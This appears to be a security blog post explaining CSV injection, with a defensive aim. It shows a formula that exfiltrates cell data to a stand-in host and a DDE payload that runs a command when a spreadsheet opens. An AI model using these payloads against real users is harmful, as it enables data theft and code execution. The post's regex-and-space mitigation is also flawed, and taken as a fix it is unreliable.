= Is that CSV Secure?

Comma-Separated Values file (or CSV) is a type of file that stores tabular data,
numbers and text in plain text. Each line of the file is a data record and
each record consists of one or more fields separated by commas. CSV is a common
data exchange format that is widely supported by consumer, business, and
scientific applications. As an example, a user may need to transfer information
from a database program that stores data in a proprietary format, to a
spreadsheet that uses a completely different format. The database program most
likely can export its data as "CSV"; the exported CSV file can then be imported
by the spreadsheet program.

There is a vulnerability in this types of format that the most of programmers
ignores, that is "CSV Injection".
As link:https://www.owasp.org/index.php/CSV-Injection[OWASP] says,
it occurs when websites embed untrusted input inside CSV files,
when a spreadsheet program is used to open a CSV file,
any cell starting with '*=*' is considered as a formula
and crafted formulas can be used to malicious attacks.

== CSV Injection Example

We have a page that stores data on a table and exports it on a CSV file

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330927/blog/is-csv-secure/csv-example_et64py.webp[page]

We put some normal data and nothing happens

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330926/blog/is-csv-secure/normal-result_twbflm.webp[result]

But what happens if we put a formula like =2+5 in a field?

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330926/blog/is-csv-secure/formula-input_x6toul.webp[formula-input]
image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330926/blog/is-csv-secure/formula-result_tuzdgy.webp[formula-result]

On our table nothing happens, but when we open the CSV file we get the result of
the formula that we introduced. This can be very dangerous if someone introduce
a more dangerous code like

----
=HYPERLINK("http://dangerous.com?x="&A3&"[CR]","Error fetching info: Click me to resolve.")
----

When the user open the file it shows a link with our malicious site

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330926/blog/is-csv-secure/hyperlink-vuln_mlaocr.webp[vuln]

Also we can execute commands on the target with this formula injection, in where
we open the calc when someone opens the CSV file

----
=cmd|' /C calc'!A0
----

It shows some warnings but the user trust in the source of the file and accept

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330925/blog/is-csv-secure/first-warning_wbfqyq.webp[warning-1]
image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330927/blog/is-csv-secure/second-warning_hha72t.webp[warning-2]

And then the code execution

image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620330926/blog/is-csv-secure/exec-example_bumpxl.webp[exec]

The effectiveness of this vulnerability is that the user trust on the source of
the file without asking himself if is the normal behaviour when someone opens a
CSV file and the program asks form permission

=== Solution

* First is user awareness, because Windows shows an alert when someone puts
command execution code in the CSV file like we've seen

* Second, input validation, the most common characters to do this attack are:

----
=,+,-,@
----

A developer could make a validation like this regex

.validation.js
[source, javascript,linenums]
----
var regexp = new RegExp(/([=,-,+,@])/g);
----

And blocking this types of input, also, can put a space between the dangerous
character like ' =' to mitigate this vulnerability

[source, javascript,linenums]
----
if(regexp.test(formData.sdata1)){
  formData.sdata1 = " "+formData.sdata1
}
if(regexp.test(formData.sdata2)){
  formData.sdata2 = " "+formData.sdata2
}
----

In this example we can see that the spreadsheet program doesn't calculate the
formula and our input is secure
